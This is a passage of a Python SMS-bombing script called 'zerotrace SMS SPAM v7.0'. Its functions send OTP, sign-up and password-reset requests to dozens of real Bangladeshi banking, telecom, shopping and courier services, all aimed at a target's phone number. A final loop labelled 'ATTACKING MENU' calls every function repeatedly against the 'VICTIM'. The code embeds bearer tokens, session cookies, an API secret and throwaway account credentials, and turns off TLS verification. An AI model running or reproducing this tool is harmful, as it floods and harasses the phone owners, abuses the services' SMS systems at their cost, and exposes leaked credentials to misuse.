    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_27(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://applink.com.bd/appstore-v4-server/login/otp/request"
        headers = {
            "User-Agent": lmnXuserAgent4,
            "Referer": "https://applink.com.bd/",
            "Content-Type": "application/json",
            "Origin": "https://applink.com.bd",
        }
        data = {
            "msisdn": "88"+number
        }
        response = requests.post(url, headers=headers, data=json.dumps(data), verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_28(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://chokrojan.com/api/v1/passenger/login/mobile"
        headers = {
            "User-Agent": lmnXuserAgent4,
            "domain-name": "chokrojan.com",
            "user-platform": "3",
            "company-id": "1",
            "Origin": "https://chokrojan.com",
            "Referer": "https://chokrojan.com/login",
            "Cookie": "_ga_TXX7J24H07=GS1.1.1681140800.3.1.1681142406.0.0.0; _ga=GA1.1.162112941.1678173405; _fbp=fb.1.1678173407195.536316567",
            "Content-Type": "application/json",
        }
        data = json.dumps({"mobile_number": number})
        response = requests.post(url, headers=headers, data=data, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_29(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://chokrojan.com/api/v1/passenger/login/mobile"
        headers = {
            "User-Agent": lmnXuserAgent4,
            "domain-name": "chokrojan.com",
            "user-platform": "3",
            "company-id": "1",
            "Origin": "https://chokrojan.com",
            "Referer": "https://chokrojan.com/login",
            "Cookie": "_ga_TXX7J24H07=GS1.1.1681140800.3.1.1681142406.0.0.0; _ga=GA1.1.162112941.1678173405; _fbp=fb.1.1678173407195.536316567",
            "Content-Type": "application/json",
        }
        data = {
            "mobile_number": number
        }
        response = requests.post(url, headers=headers, data=json.dumps(data))
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_30(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": lmnXuserAgent4
        }
        data = {
            "AccessToken": "",
            "TrackingNo": "",
            "mobileNo": number,
            "otpSms": "",
            "product_id": "250",
            "requestChannel": "MOB",
            "trackingStatus": 5
        }
        response = requests.post(url, headers=headers, data=json.dumps(data), verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_31(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = 'https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber'
        data = {
            'data': {
                'flag': 'https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png',
                'code': '88',
                'contact_no': number,
                'country_calling_code': '88',
                'headers': {
                    'PlatForm': 'Web'
                }
            }
        }
        headers = {
            'Content-type': 'application/json',
            'Referer': 'https://doctime.com.bd/',
            'Origin': 'https://doctime.com.bd',
            'User-Agent': lmnXuserAgent4,
        }
        response = requests.post(url, headers=headers, data=json.dumps(data), verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_32(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://core.easy.com.bd/api/v1/registration"
        headers = {
            "User-Agent": lmnXuserAgent4,
            "Referer": "https://easy.com.bd/",
            "Content-Type": "application/json",
        }
        data = {
            "name": "Limon Islam",
            "email": "uyrlhkgxqw@emergentvillage.org",
            "mobile": number,
            "password": "boss#2022",
            "password_confirmation": "boss#2022",
            "device_key": "9a28ae67c5704e1fcb50a8fc4ghjea4d"
        }
        response = requests.post(url, headers=headers, data=json.dumps(data), verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_33(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://eshop-api.banglalink.net/api/v1/customer/send-otp"
        headers = {
            "User-Agent": lmnXuserAgent4,
            "Content-Type": "application/json",
        }
        data = {
            "type": "phone",
            "phone": number,
        }
        response = requests.post(url, headers=headers, data=json.dumps(data), verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_34(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        api_url = 'https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber'
        access_token = ''
        tracking_no = ''
        otp_sms = ''
        product_id = '122'
        request_channel = 'MOB'
        tracking_status = 5
        data = {
            'AccessToken': access_token,
            'TrackingNo': tracking_no,
            'mobileNo': number,
            'otpSms': otp_sms,
            'product_id': product_id,
            'requestChannel': request_channel,
            'trackingStatus': tracking_status,
        }
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': lmnXuserAgent4,
        }
        response = requests.post(api_url, json=data, headers=headers)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_35(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = f"https://api.mygp.cinematic.mobi/api/v1/otp/88{number}/SBENT_3GB7D"
        headers = {
            "User-Agent": lmnXuserAgent4,
            "Content-Type": "application/json",
        }
        data = {
            "accessinfo": {
                "access_token": "K165S6V6q4C6G7H0y9C4f5W7t5YeC6",
                "referenceCode": "20190827042622"
            }
        }
        response = requests.post(url, json=data, headers=headers)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_36(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp"
        data = {
            "phone": number,
            "email": "",
            "language": "en"
        }
        headers = {
            "Content-Type": "application/json",
            "User-Agent": lmnXuserAgent5
        }
        response = requests.post(url, json=data, headers=headers)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_37(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = f"https://app.hishabee.business/api/V2/otp/send?mobile_number={number}"
        headers = {
            "User-Agent": lmnXuserAgent4,
            "Content-Type": "application/json",
            "Content-Length": "0"
        }
        response = requests.post(url, headers=headers)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_38(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = f"http://apibeta.iqra-live.com/api/v1/sent-otp/{number}"
        response = requests.get(url, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_39(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://smart1216.robi.com.bd/robi_sivr/public/login/phone"
        number = number.lstrip('0')
        headers = {
            "Content-Type": "application/json",
            "User-Agent": lmnXuserAgent4,
        }
        data = {
            "cli": ""+number
        }
        response = requests.post(url, headers=headers, json=data, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_40(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://user-api.jslglobal.co:444/v1/send-otp"
        headers = {
            "User-Agent": lmnXuserAgent6,
            "Origin": "https://rental.jatri.co",
            "Referer": "https://rental.jatri.co/",
        }
        data = {
            "phone": "+88"+number,
            "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"
        }
        response = requests.post(url, headers=headers, data=data, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_41(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://www.mcbaffiliate.com/Affiliate/RequestOTP"
        headers = {
            "User-Agent": lmnXuserAgent7,
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data = {"PhoneNumber": number}
        response = requests.post(url, headers=headers, data=data, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_42(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://mithaibd.com/api/login/?lang_code=en¤cy_code=BDT"
        headers = {
            "user-agent": "okhttp/4.2.2",
            "Authorization": "Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==",
            "Content-Type": "application/json",
        }
        data = json.dumps({
            "company_id": "2",
            "password2": "Rahu333@@",
            "currency_code": "BDT",
            "user_type": "C",
            "email": "fuckyoubro"+number+"@gmail.com",
            "g_id": "",
            "lang_code": "en",
            "operating_system": "Android",
            "otp_verify": False,
            "password1": "Rahu333@@",
            "phone": number,
            "storefront_id": "5"
        })
        response = requests.post(url, headers=headers, data=data, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_43(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://api.englishmojabd.com/api/v1/auth/login"
        data = {
            "phone": "+88"+number
        }
        headers = {
            "Content-Type": "application/json"
        }
        response = requests.post(url, headers=headers, data=json.dumps(data))
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_44(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp"
        headers = {
            "User-Agent": lmnXuserAgent4,
            "Origin": "https://moveon.com.bd",
            "Alt-Used": "moveon.com.bd",
            "Referer": "https://moveon.com.bd/auth/register",
            "Cookie": "_ga_859WPGTZ3G=GS1.1.1676461030.2.1.1676462180.60.0.0; _ga=GA1.1.721458614.1675951340; cw_conversation=eyJhbGciOiJIUzI1NiJ9.eyJzb3VyY2VfaWQiOiJmZWFjNGU1ZS05ZWFjLTRiNmUtOGE0NS0wYTZmZGIzYTEwM2IiLCJpbmJveF9pZCI6M30.LHi3LXYC1jwkCEToPcecMmbGAuswXhjwM0ezittu0I4; G_ENABLED_IDPS=google; _hjSessionUser_2677527=eyJpZCI6IjRhZWZjZDA3LTUzOWMtNTY3Yy05OWM3LWIyYmUwNDE0OTM4ZSIsImNyZWF0ZWQiOjE2NzY0NjEwNDIxMjMsImV4aXN0aW5nIjp0cnVlfQ==",
            "Content-Type": "application/json",
        }
        data = json.dumps({"phone": number})
        response = requests.post(url, headers=headers, data=data, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_45(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://api.osudpotro.com/api/v1/users/send_otp"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": lmnXuserAgent4,
        }
        data = json.dumps({
            "mobile": "+88-"+number,
            "deviceToken": "app",
            "language": "bn",
            "os": "android"
        })
        response = requests.post(url, headers=headers, data=data, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_46(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{number}&lang=en&ng=0"
        headers = {
            "user-agent": lmnXuserAgent8,
        }
        response = requests.get(url, headers=headers, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_47(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": lmnXuserAgent4,
        }
        data = json.dumps({
            "full_name": "Hangama",
            "company_name": "Hangama",
            "email_address": "hangama@gmail.com",
            "phone_number": number
        })
        response = requests.post(url, headers=headers, data=data, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_48(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://auth.qcoom.com/api/v1/otp/send"
        headers = {
            "User-Agent": lmnXuserAgent4,
            "Referer": "https://qcoom.com/",
            "Content-Type": "application/json",
        }
        data = {
            "mobileNumber": "+88"+number,
        }
        response = requests.post(url, json=data, headers=headers, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_49(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://reseller.circle.com.bd/api/v2/auth/signup"
        headers = {
            "User-Agent": lmnXuserAgent7,
            "Content-Type": "application/json",
        }
        data = {
            "name": "+88"+number,
            "email_or_phone": "+88"+number,
            "password": "123456lmn",
            "password_confirmation": "123456lmn",
            "register_by": "phone"
        }
        response = requests.post(url, json=data, headers=headers)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_50(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0"
        headers = {
            "User-Agent": lmnXuserAgent4,
            "Content-Type": "application/json",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s"
        }
        data = {
            "phone": number
        }
        response = requests.post(url, headers=headers, json=data, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_51(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://api-gateway.sundarbancourierltd.com/graphql"
        data = {
            "operationName": "CreateAccessToken",
            "variables": {
                "accessTokenFilter": {
                    "userName": number
                }
            },
            "query": """mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {
                createAccessToken(accessTokenFilter: $accessTokenFilter) {
                    message
                    statusCode
                    result {
                        phone
                        otpCounter
                        __typename
                    }
                    __typename
                }
            }"""
        }
        headers = {
            'Content-Type': 'application/json',
            'Host': 'api-gateway.sundarbancourierltd.com',
            'User-Agent': lmnXuserAgent10,
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://customer.sundarbancourierltd.com/',
            'Origin': 'https://customer.sundarbancourierltd.com',
        }
        response = requests.post(url, json=data, headers=headers)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_52(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://api.toybox.live/bdapps_handler.php"
        data = {
            "Operation": "CreateSubscription",
            "MobileNumber": "88"+number,
            "PackageID": 100,
            "Secret": "HJKX71%UHYH"
        }
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': lmnXuserAgent11
        }
        response = requests.post(url, headers=headers, data=json.dumps(data))
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_53(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://api.win2gain.com/api/Users/RequestOtp?msisdn=88"+number
        headers = {
            'sourcePlatform': 'web',
            'client': '2'
        }
        response = requests.get(url, headers=headers)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_54(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp"
        data = {
            "deviceId": "7dtdhid45c0f0901",
            "deviceInfo": {
                "deviceInfoSignature": "D0923F3GDHJXJDTIHFDTIGGHURHFATI7605A3FA",
                "deviceId": "7d8b0agi0g0f0901",
                "firebaseDeviceToken": "",
                "manufacturer": "MI",
                "modelName": "NOTE 10",
                "osFirmWireBuild": "",
                "osName": "Android",
                "osVersion": "10",
                "rootDevice": 0
            },
            "operator": "Gp",
            "walletNumber": number
        }
        headers = {
            "Content-Type": "application/json"
        }
        response = requests.post(url, json=data, headers=headers)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_55(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://rootsedulive.com/api/auth/register"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = {
            "name": "Pagli Khatun",
            "phone": f"88{number}",
            "email": f"subap{number}agli2023@gmail.com",
            "password": "iDSnWh6rzp9KNAY",
            "confirmPassword": "iDSnWh6rzp9KNAY"
        }
        response = requests.post(url, data=data, headers=headers, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_56(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://rootsedulive.com/api/auth/forget-password"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = {
            "phoneOrEmail": f"88{number}"
        }
        response = requests.post(url, data=data, headers=headers, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_57(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://www.mcbaffiliate.com/Affiliate/RequestOTP"
        headers = {
            "User-Agent": lmnXuserAgent7,
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = {
            "PhoneNumber": number
        }
        response = requests.post(url, data=data, headers=headers, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_58(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = f"https://app.hishabee.business/api/V2/otp/send?mobile_number={number}"
        headers = {
            "User-Agent": lmnXuserAgent4,
            "Content-Type": "application/json",
        }
        response = requests.post(url, headers=headers, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_59(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp"
        data = {
            "phone": number,
            "email": "",
            "language": "en"
        }
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': lmnXuserAgent9
        }
        response = requests.post(url, json=data, headers=headers, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_60(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{number}/"
        headers = {
            "User-Agent": lmnXuserAgent4,
            "Content-Type": "application/json",
        }
        response = requests.post(url, headers=headers, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass


#----------[ zerotrace ATTACKING MENU ]----------#


def DARKS(number,amo):
    os.system("clear");print(logo)
    Lxj(f"{c} <{w}/{c}> {g}⚡ zerotrace SMS SPAM {r}v7.0 {g}STARTED\n")
    Lxj(f"{c} <{w}/{c}> {g}VICTIM {w}|{g} AMOUNT {c}➤ {r}"+str(number)+f"{c} | {r}"+str(amo)+"\n")
    lnx()
    for x in range(amo):
        x+=1
        lmnXlija_1(number);zerotrace(f" </> zerotrace v7.0 [{x}-01]")
        lmnXlija_2(number);zerotrace(f" </> zerotrace v7.0 [{x}-02]")
        lmnXlija_3(number);zerotrace(f" </> zerotrace v7.0 [{x}-03]")
        lmnXlija_4(number);zerotrace(f" </> zerotrace v7.0 [{x}-04]")
        lmnXlija_5(number);zerotrace(f" </> zerotrace v7.0 [{x}-05]")
        lmnXlija_6(number);zerotrace(f" </> zerotrace v7.0 [{x}-06]")
        lmnXlija_7(number);zerotrace(f" </> zerotrace v7.0 [{x}-07]")
        lmnXlija_8(number);zerotrace(f" </> zerotrace v7.0 [{x}-08]")
        lmnXlija_9(number);zerotrace(f" </> zerotrace v7.0 [{x}-09]")
        lmnXlija_10(number);zerotrace(f" </> zerotrace v7.0 [{x}-10]")
        lmnXlija_11(number);zerotrace(f" </> zerotrace v7.0 [{x}-11]")
        lmnXlija_12(number);zerotrace(f" </> zerotrace v7.0 [{x}-12]")
        lmnXlija_13(number);zerotrace(f" </> zerotrace v7.0 [{x}-13]")
        lmnXlija_14(number);zerotrace(f" </> zerotrace v7.0 [{x}-14]")
        lmnXlija_15(number);zerotrace(f" </> zerotrace v7.0 [{x}-15]")
        lmnXlija_16(number);zerotrace(f" </> zerotrace v7.0 [{x}-16]")
        lmnXlija_17(number);zerotrace(f" </> zerotrace v7.0 [{x}-17]")
        lmnXlija_18(number);zerotrace(f" </> zerotrace v7.0 [{x}-18]")
        lmnXlija_19(number);zerotrace(f" </> zerotrace v7.0 [{x}-19]")
        lmnXlija_20(number);zerotrace(f" </> zerotrace v7.0 [{x}-20]")
        lmnXlija_21(number);zerotrace(f" </> zerotrace v7.0 [{x}-21]")
        lmnXlija_22(number);zerotrace(f" </> zerotrace v7.0 [{x}-22]")
        lmnXlija_23(number);zerotrace(f" </> zerotrace v7.0 [{x}-23]")
        lmnXlija_24(number);zerotrace(f" </> zerotrace v7.0 [{x}-24]")
        lmnXlija_25(number);zerotrace(f" </> zerotrace v7.0 [{x}-25]")
        lmnXlija_26(number);zerotrace(f" </> zerotrace v7.0 [{x}-26]")
        lmnXlija_27(number);zerotrace(f" </> zerotrace v7.0 [{x}-27]")
        lmnXlija_28(number);zerotrace(f" </> zerotrace v7.0 [{x}-28]")
        lmnXlija_29(number);zerotrace(f" </> zerotrace v7.0 [{x}-29]")
        lmnXlija_30(number);zerotrace(f" </> zerotrace v7.0 [{x}-30]")
        lmnXlija_31(number);zerotrace(f" </> zerotrace v7.0 [{x}-31]")
        lmnXlija_32(number);zerotrace(f" </> zerotrace v7.0 [{x}-32]")
        lmnXlija_33(number);zerotrace(f" </> zerotrace v7.0 [{x}-33]")
        lmnXlija_34(number);zerotrace(f" </> zerotrace v7.0 [{x}-34]")
        lmnXlija_35(number);zerotrace(f" </> zerotrace v7.0 [{x}-35]")
        lmnXlija_36(number);zerotrace(f" </> zerotrace v7.0 [{x}-36]")
        lmnXlija_37(number);zerotrace(f" </> zerotrace v7.0 [{x}-37]")
        lmnXlija_38(number);zerotrace(f" </> zerotrace v7.0 [{x}-38]")
        lmnXlija_39(number);zerotrace(f" </> zerotrace v7.0 [{x}-39]")
        lmnXlija_40(number);zerotrace(f" </> zerotrace v7.0 [{x}-40]")
        lmnXlija_41(number);zerotrace(f" </> zerotrace v7.0 [{x}-41]")
        lmnXlija_42(number);zerotrace(f" </> zerotrace v7.0 [{x}-42]")
        lmnXlija_43(number);zerotrace(f" </> zerotrace v7.0 [{x}-43]")
        lmnXlija_44(number);zerotrace(f" </> zerotrace v7.0 [{x}-44]")
        lmnXlija_45(number);zerotrace(f" </> zerotrace v7.0 [{x}-45]")
        lmnXlija_46(number);zerotrace(f" </> zerotrace v7.0 [{x}-46]")
        lmnXlija_47(number);zerotrace(f" </> zerotrace v7.0 [{x}-47]")
        lmnXlija_48(number);zerotrace(f" </> zerotrace v7.0 [{x}-48]")
        lmnXlija_49(number);zerotrace(f" </> zerotrace v7.0 [{x}-49]")
        lmnXlija_50(number);zerotrace(f" </> zerotrace v7.0 [{x}-50]")
        lmnXlija_51(number);zerotrace(f" </> zerotrace v7.0 [{x}-51]")
        lmnXlija_52(number);zerotrace(f" </> zerotrace v7.0 [{x}-52]")
        lmnXlija_53(number);zerotrace(f" </> zerotrace v7.0 [{x}-53]")
        lmnXlija_54(number);zerotrace(f" </> zerotrace v7.0 [{x}-54]")
        lmnXlija_55(number);zerotrace(f" </> zerotrace v7.0 [{x}-55]")
        lmnXlija_56(number);zerotrace(f" </> zerotrace v7.0 [{x}-56]")
        lmnXlija_57(number);zerotrace(f" </> zerotrace v7.0 [{x}-57]")
        lmnXlija_58(number);zerotrace(f" </> zerotrace v7.0 [{x}-58]")
        lmnXlija_59(number);zerotrace(f" </> zerotrace v7.0 [{x}-59]")
        lmnXlija_60(number);zerotrace(f" </> zerotrace v7.0 [{x}-60]")
    lnx()
    print(f"{c} <{w}/{c}> {g}⚡ SMS SPAM {r}v7.0 {g}Successfully Completed !");lnx()
    print(f"{c} <{w}/{c}> {g}💥 Please Run Again For Spam Again {w}>{g}> \n")
    os._exit(0)


MAIN_x_zerotrace()